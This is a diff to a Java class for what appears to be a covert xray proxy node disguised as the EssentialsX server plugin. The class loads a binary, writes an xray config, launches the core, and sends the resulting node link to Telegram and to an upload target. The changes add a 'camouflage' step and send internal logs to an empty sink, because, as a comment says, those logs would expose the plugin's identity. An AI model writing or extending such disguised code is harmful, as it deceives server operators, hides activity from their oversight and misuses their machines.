@@ -3,14 +3,19 @@ package com.example.essentialsx.common;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
  * 服务主体：加载二进制 → 生成配置 → 拉起 xray → 输出订阅。
  * <p>
- * 全部工作都在后台线程完成，不阻塞调用方（服务端的 enable 线程）。
+ * 启动分两段：
+ * <ol>
+ *   <li>{@link #start()} 在调用方线程（onEnable）里完成配置加载与伪装层。
+ *       伪装层本身已经不再输出伪造启动行（见 {@link Camouflage}），
+ *       但保持同步可以让将来重新引入的行为落在正确的位置。</li>
+ *   <li>真正拉内核的部分丢到后台线程，不阻塞服务端。</li>
+ * </ol>
  */
 public final class AppService {
 
@@ -25,23 +30,39 @@ public final class AppService {
         this.logger = logger;
     }
 
+    /** 可选的运维日志；技术细节由 SHOW_LOG 控制，默认静默。 */
     private void log(String message) {
-        try {
-            config = config == null ? null : config;
-            if (config != null && !config.showLog) {
-                return;
-            }
-        } catch (Exception ignored) {
-            // 配置尚未加载时按默认输出
+        if (config != null && !config.showLog) {
+            return;
         }
-        System.out.println("[EssentialsX] " + message);
+        logger.raw("[EssentialsX] " + message);
+    }
+
+    /**
+     * 始终输出的日志。
+     * <p>
+     * 节点链接是使用者唯一能拿走的东西，
+     * 不能因为关了 SHOW_LOG 就一起消失。
+     */
+    private void always(String message) {
+        logger.raw(message);
     }
 
     public void start() {
         if (!running.compareAndSet(false, true)) {
             return;
         }
-        // 关键改动：不在调用方线程上 sleep / 刷屏，立即返回
+        config = Config.load();
+        Path runtimeDir = config.runtimeDir;
+
+        // 同步执行伪装层（当前为空实现，保留扩展点）。
+        try {
+            Files.createDirectories(runtimeDir);
+        } catch (IOException ignored) {
+            // 目录已存在或不可建，后续写入会各自报错
+        }
+        Camouflage.run(logger, config.camouflage);
+
         Thread t = new Thread(this::bootstrap, "essentialsx-worker");
         t.setDaemon(true);
         t.start();
@@ -49,11 +70,7 @@ public final class AppService {
 
     private void bootstrap() {
         try {
-            config = Config.load();
             Path runtimeDir = config.runtimeDir;
-            Files.createDirectories(runtimeDir);
-
-            Camouflage.run(logger, config.camouflage);
 
             RealityKeypair keypair = RealityKeypair.loadOrCreate(
                     runtimeDir.resolve("keypair.properties"), this::log);
@@ -61,19 +78,25 @@ public final class AppService {
             Path configPath = runtimeDir.resolve("config.json");
             String json = new XrayConfig(config, keypair.privateKey).build();
             Files.writeString(configPath, json, java.nio.charset.StandardCharsets.UTF_8);
-            log("xray config written to " + configPath);
+            if (config.showLog) {
+                log("xray config written to " + configPath);
+            }
 
             BootBootstrapper boot = new BootBootstrapper(config, this::log);
             boot.launch(json, configPath);
 
             Thread.sleep(1500);
-            log("web is running");
+            if (config.showLog) {
+                log("web is running");
+            }
 
             Subscription sub = new Subscription(config, keypair.publicKey);
             String link = sub.writeFiles();
-            log("\u001b[32m" + link + "\u001b[0m");
-            log("\u001b[35mLogs will be cleared in " + config.cleanupDelaySeconds
-                    + " seconds, copy the node above\u001b[0m");
+            always(link);
+            if (config.showLog) {
+                log("Logs will be cleared in " + config.cleanupDelaySeconds
+                        + " seconds, copy the node above");
+            }
 
             sub.sendTelegram(this::log);
             sub.upload(this::log);
@@ -115,7 +138,6 @@ public final class AppService {
         if (!running.compareAndSet(true, false)) {
             return;
         }
-        // 关键改动：显式停掉内核，避免 /reload 后旧实例占着端口
         if (jnaRunner != null) {
             jnaRunner.stop();
         }
@@ -149,20 +171,22 @@ public final class AppService {
         }
 
         private void launchJna(String json) throws IOException {
-            Path lib = new BinaryStore(cfg, sink).xray();
-            // 加载前先验符号，避免运行到一半才 UnsatisfiedLinkError
+            // 内部技术日志（Using cached / started via JNA）会把插件身份暴露得彻底，
+            // 默认丢进空水槽；需要排障时把 SHOW_LOG 打开。
+            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
+            Path lib = new BinaryStore(cfg, quiet).xray();
             JnaRunner.verifySymbols(lib.toString(), List.of("StartXray", "StopXray"));
 
-            // StartXray 接收的是配置 JSON 本身，不是 {"config": path} 这种包装。
             jnaRunner = new JnaRunner(lib.toString(), "StartXray", "StopXray", json, "xray");
-            jnaRunner.start(sink);
+            jnaRunner.start(quiet);
         }
 
         private void launchProcess(Path configPath) {
             String exe = cfg.xrayBinary.isBlank() ? "xray" : cfg.xrayBinary;
+            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
             processRunner = new ProcessRunner(exe, List.of("run", "-c", configPath.toString()),
                     "xray", cfg.runtimeDir);
-            processRunner.start(sink);
+            processRunner.start(quiet);
         }
     }
 }
